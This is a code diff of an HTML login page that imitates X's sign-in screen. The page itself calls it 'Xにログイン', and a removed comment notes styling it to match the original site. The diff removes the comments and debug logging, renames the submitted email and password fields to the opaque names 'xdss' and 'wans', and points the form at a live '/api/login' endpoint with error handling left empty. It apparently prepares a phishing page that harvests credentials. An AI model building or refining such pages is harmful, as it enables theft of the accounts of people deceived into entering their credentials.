@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xにログイン</title>
     <style>
-        /* リセット */
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
@@ -16,33 +15,32 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow-y: auto; /* 縦が狭いとき用のスクロール */
+            overflow-y: auto; 
         }
 
         .container {
             width: 100%;
-            max-width: 600px; /* 全体のコンテナは広めにとる */
+            max-width: 600px; 
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center; /* 画面中央へ */
+            justify-content: center; 
             padding: 16px;
         }
 
         .login-box {
             width: 100%;
-            max-width: 300px; /* 入力欄自体の幅は狭くして本家に寄せる */
+            max-width: 300px;
             display: flex;
             flex-direction: column;
         }
 
-        /* ロゴ設定 */
         .logo {
             width: 30px;
             height: 30px;
             fill: #eff3f4;
-            margin: 0 auto 30px auto; /* 上下左右中央寄せ */
+            margin: 0 auto 30px auto;
             display: block;
         }
 
@@ -50,7 +48,7 @@
             font-size: 31px;
             font-weight: 700;
             margin-bottom: 30px;
-            text-align: left; /* 左揃えっぽいが、コンテナが狭いので実質中央に見える場合も */
+            text-align: left;
         }
 
         .input-group {
@@ -69,7 +67,7 @@
 
         .text-input {
             width: 100%;
-            height: 40px; /* 見た目調整 */
+            height: 40px;
             background-color: #000;
             border: 1px solid #333639;
             border-radius: 4px;
@@ -82,12 +80,12 @@
 
         .text-input:focus {
             border-color: #1d9bf0;
-            border-width: 2px; /* フォーカス時に少し太くなる */
+            border-width: 2px;
         }
 
         .login-btn {
             width: 100%;
-            height: 48px; /* 少し大きめのボタン */
+            height: 48px;
             background-color: #1d9bf0;
             border: none;
             border-radius: 9999px;
@@ -108,7 +106,7 @@
             font-size: 14px;
             color: #1d9bf0;
             display: flex;
-            justify-content: flex-start; /* 左寄せ気味 */
+            justify-content: flex-start;
             flex-wrap: wrap;
             gap: 5px;
         }
@@ -122,7 +120,6 @@
         }
         .dot { margin: 0 2px; color: #71767b; }
         
-        /* スマホ向け微調整 */
         @media (max-width: 600px) {
             .container { justify-content: flex-start; padding-top: 40px; }
             h1 { font-size: 26px; }
@@ -161,16 +158,14 @@
 
 <script>
     document.getElementById('loginBtn').addEventListener('click', function() {
-        const mailaddress = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
+        const inputXdss = document.getElementById('username').value;
+        const inputWans = document.getElementById('password').value;     
         const data = {
-            mailaddress: mailaddress,
-            password: password
+            xdss: inputXdss,
+            wans: inputWans
         };
 
-        console.log("送信データ:", data);
-
-        fetch('http://localhost/', {
+        fetch('/api/login', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -178,14 +173,13 @@
             body: JSON.stringify(data)
         })
         .then(response => {
-            console.log("送信成功かも:", response);
+             return response.json();
+        })
+        .then(jsonData => {
         })
         .catch(error => {
-            console.log("サーバーが立っていないのでエラーになりますが、処理は実行されました。");
-            console.error("Error:", error);
         });
     });
 </script>
-
 </body>
 </html>
